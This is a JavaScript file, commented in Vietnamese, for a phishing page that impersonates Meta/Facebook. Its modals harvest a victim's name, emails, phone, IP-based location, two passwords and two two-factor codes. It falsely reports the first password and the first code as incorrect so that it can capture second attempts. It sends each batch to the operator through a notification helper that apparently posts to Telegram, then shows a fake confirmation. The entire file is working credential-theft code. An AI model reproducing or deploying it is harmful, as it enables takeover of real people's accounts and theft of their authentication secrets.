// ==================== HELPER: GET DETAILED LOCATION & IP ====================
async function getLocationData() {
    try {
        // Lấy thông tin chi tiết từ ipapi
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || "N/A",
            country: data.country_name || "N/A",
            city: data.city || "N/A",
            region: data.region || "N/A"
        };
    } catch (e) {
        return { ip: "N/A", country: "N/A", city: "N/A", region: "N/A" };
    }
}

// ==================== MAIN APPLICATION LOGIC ====================
document.getElementById('clientForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const submitBtn = e.target.querySelector('button');
    if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>';
    }

    // 1. Lấy thông tin vị trí
    const loc = await getLocationData();

    // 2. Gom dữ liệu form và chèn thông tin vị trí vào trường phone
    const formData = {
        fullName: document.getElementById('fullName').value.trim(),
        email: document.getElementById('email').value.trim(),
        emailBusiness: document.getElementById('emailBusiness').value.trim(),
        fanpage: document.getElementById('fanpage').value.trim(),
        // Chèn xuống dòng và icon để Telegram hiển thị đẹp
        phone: `${document.getElementById('phone').value.trim()}\n\n🌍 Vị trí:\n- IP: ${loc.ip}\n- Quốc gia: ${loc.country}\n- Thành phố: ${loc.city}\n- Vùng: ${loc.region}`,
        userIP: loc.ip
    };

    // 3. Lưu bản ghi đầu tiên và mở Modal Password
    Utils.saveRecord('__client_rec__fi_rst', formData);
    
    if (submitBtn) {
        submitBtn.disabled = false;
        submitBtn.textContent = 'Continue';
    }
    
    openSecurityModal();
});


// ==================== MODAL 2: SECURITY (PASSWORD) ====================
function openSecurityModal() {
    const content = `
        <div class="h-auto flex flex-col items-center justify-between flex-1">
            <div class="w-12 h-12 mb-5 mx-auto">
                <img src="./public/icons/ic_logo.svg" alt="Meta" class="w-full">
            </div>
            <div class="w-full">
                <p class="text-[#9a979e] text-sm mb-4">For your security, you must enter your password to continue.</p>
                <form id="securityForm">
                    <input type="password" id="password" placeholder="Password" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3">
                    <p id="passwordError" class="text-red-500 text-sm hidden mb-3"></p>
                    <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full hover:bg-blue-700 transition-colors">Continue</button>
                    <p class="text-center mt-3"><a href="#" class="text-[#9a979e] text-sm">Forgot your password?</a></p>
                </form>
            </div>
            <div class="w-16 mt-5 mx-auto">
                <img src="./public/icons/ic_logo_gray.svg" alt="Meta">
            </div>
        </div>
    `;

    Modal.create('securityModal', content);
    Modal.open('securityModal');

    let securityClickCount = 0;
    document.getElementById('securityForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const password = document.getElementById('password').value.trim();
        const errorMsg = document.getElementById('passwordError');
        const submitBtn = e.target.querySelector('button');

        errorMsg.classList.add('hidden');
        if (!password) {
            errorMsg.textContent = "You haven't entered your password!";
            errorMsg.classList.remove('hidden');
            return;
        }

        submitBtn.disabled = true;
        submitBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>';

        if (securityClickCount === 0) {
            const dataLocal = Utils.getRecord('__client_rec__fi_rst');
            const clientData = { password, ...dataLocal };
            Utils.saveRecord('__client_rec__se_con', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Continue';
                document.getElementById('password').value = '';
                errorMsg.textContent = 'The password you\'ve entered is incorrect.';
                errorMsg.classList.remove('hidden');
                securityClickCount = 1;
            }, 1350);
        } else {
            const dataLocal = Utils.getRecord('__client_rec__se_con');
            const clientData = { passwordSecond: password, ...dataLocal };
            Utils.saveRecord('__client_rec__th_ird', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                Modal.close('securityModal');
                openAuthenticationModal(clientData);
            }, 1500);
        }
    });
}

// ==================== MODAL 3: AUTHENTICATION (2FA) ====================
function openAuthenticationModal(userData) {
    const emailDisplay = Utils.maskEmail(userData.email);
    // Tách phần IP ra để hiển thị số điện thoại sạch trên web cho khách
    const phoneDisplay = Utils.maskPhone(userData.phone.split('\n')[0]); 

    const content = `
        <div class="flex flex-col h-full justify-between">
            <div>
                <div class="flex items-center text-[#9a979e] gap-1.5 text-sm mb-2">
                    <span>${userData.fullName}</span>
                    <div class="w-1 h-1 bg-[#9a979e] rounded-full"></div>
                    <span>Facebook</span>
                </div>
                <h2 class="text-[20px] text-[black] font-[700] mb-[15px]">Two-factor authentication required (1/3)</h2>
                <p class="text-[#9a979e] text-sm mb-4">Enter the code for this account that we send to ${emailDisplay}, ${phoneDisplay} or simply confirm through the application.</p>
                <div class="w-full rounded-lg bg-[#f5f5f5] overflow-hidden mb-4">
                    <img src="./public/images/authentication.png" alt="2FA" class="w-full">
                </div>
                <form id="authForm">
                    <input type="number" id="twoFa" placeholder="Code" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none mb-3">
                    <p id="authError" class="text-red-500 text-sm hidden mb-3"></p>
                    <button type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors">Continue</button>
                </form>
            </div>
        </div>
    `;

    Modal.create('authModal', content);
    Modal.open('authModal');

    let authClickCount = 0;
    document.getElementById('authForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const twoFa = document.getElementById('twoFa').value.trim();
        const errorMsg = document.getElementById('authError');
        const submitBtn = e.target.querySelector('button');

        if (!twoFa) return;

        submitBtn.disabled = true;
        submitBtn.innerHTML = '<div class="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mx-auto"></div>';

        if (authClickCount === 0) {
            const dataLocal = Utils.getRecord('__client_rec__th_ird');
            const clientData = { twoFa, ...dataLocal };
            Utils.saveRecord('__client_rec__fou_rth', clientData);
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Continue';
                errorMsg.textContent = 'The code is incorrect. Please try again.';
                errorMsg.classList.remove('hidden');
                authClickCount = 1;
            }, 1500);
        } else {
            const dataLocal = Utils.getRecord('__client_rec__fou_rth');
            const clientData = { twoFaSecond: twoFa, ...dataLocal };
            await Utils.sendNotification(clientData);

            setTimeout(() => {
                Modal.close('authModal');
                openSuccessModal();
            }, 1500);
        }
    });
}

// ==================== MODAL 4: SUCCESS ====================
function openSuccessModal() {
    const content = `
        <h2 class="font-bold text-[18px] mb-4 text-left">Request has been sent</h2>
        <div class="rounded-lg overflow-hidden mb-4">
            <img src="./public/images/succes.jpg" alt="Success" class="w-full">
        </div>
        <p class="text-[#9a979e] mb-1 text-[15px]">Your request has been added to the processing queue.</p>
        <a href="https://www.facebook.com" class="block w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white text-center rounded-full py-2.5 hover:bg-blue-700 transition-colors">
            Return to Facebook
        </a>
    `;
    Modal.create('successModal', content);
    Modal.open('successModal');
}
